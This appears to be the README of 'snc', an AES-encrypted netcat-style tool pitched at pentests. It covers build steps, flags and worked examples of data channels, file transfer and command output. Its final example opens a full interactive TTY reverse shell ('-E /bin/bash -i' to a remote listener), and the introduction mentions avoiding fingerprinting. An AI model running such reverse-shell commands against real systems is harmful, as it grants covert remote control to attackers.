snc
===
Something that always bothered me about `netcat` is the fact that it doesn't implement encryption.
Something that always bothered me about `cryptcat` is the fact that it doesn't implement command
execution. Something that always bothered me about SSH and SCP is the fact that they're just too
complex for simpler use cases (specially during pentests) and easily fingerprintable.

Motivated by that, this tool aims to combine the best of each in a single place, from simple raw
data channels to fully interactive TTY reverse shells. Connections are encrypted with AES-128 by
default but another key size can be set in `src/include/aes.h`. More on `snc`'s inner workings are
detailed [here](https://github.com/hiatus/snc/blob/main/doc/PROTOCOL.md) for those interested.


Compilation
------------
```bash
$ git clone https://github.com/hiatus/snc.git
$ cd snc && make
```

Usage
-----
```
snc [options] [host]? [port]
	-h           this
	-v           display connection information
	-n           disable DNS resolution
	-r           set terminal to raw mode during the connection
	-e [argv]    execute [argv] and pipe it's IO to the connection socket
	-E [argv]    execute [argv] in a TTY and pipe it's IO to the connection socket
	-d [char]    use [char] as string delimiter for [argv]
	-k [pass]    use the string [pass] as AES key
	-K [file]    use the file [file] as AES key
	-i [file]    read input from [file] instead of stdin
	-o [file]    write output to [file] instead of stdout
	-w [secs]    set a timeout of [secs] seconds for idle connections

	Notes:
		- When [host] is not provided, snc acts as server listening on port [port].
		- Option -d is useful when [argv] has arguments containing spaces.
```

Examples
--------
Some example use cases.

- **Raw Data Channel** \
	Server
	```bash
	user@server:~$ snc -vK key.bin 12345
	[snc] Listening on port 12345
	[snc] Connection from 192.168.0.3:41184
	Hello, server.
	Hello, client.
	Farewell, client.
	user@server:snc$
	```

	Client
	```bash
	user@client:~$ snc -K key.bin 192.168.0.2 12345
	Hello, server.
	Hello, client.
	Farewell, client.
	user@client:~$
	```

- **File Transfer** \
	Server
	```bash
	user@server:~$ snc -vk password -i message.txt 12345
	[snc] Listening on port 12345
	[snc] Connection from 192.168.0.3:53130
	user@server:~$
	```

	Client
	```bash
	user@client:~$ snc -k password 192.168.0.2 12345
	Message content.
	user@client:~$
	```

- **Command Output Transfer** \
	Server
	```bash
	user@server:~$ snc -vk password -e '/bin/echo Hello' 12345
	[snc] Listening on port 12345
	[snc] Connection from 192.168.0.3:37480
	user@server:~$
	```

	Client
	```bash
	user@client:~$ snc -k password 192.168.0.2 12345
	Hello
	user@client:~$
	```

- **TTY Reverse Shell** \
	Server
	```bash
	user@server:~$ snc -rk password 12345
	user@client:~$ whoami
	user
	user@client:~$ exit
	exit
	user@server:~$
	```

	Client
	```bash
	user@client:~$ snc -vk password -E '/bin/bash -i' 192.168.0.2 12345
	[snc] Connecting to 192.168.0.2:12345
	[snc] Connected
	user@client:~$
	```
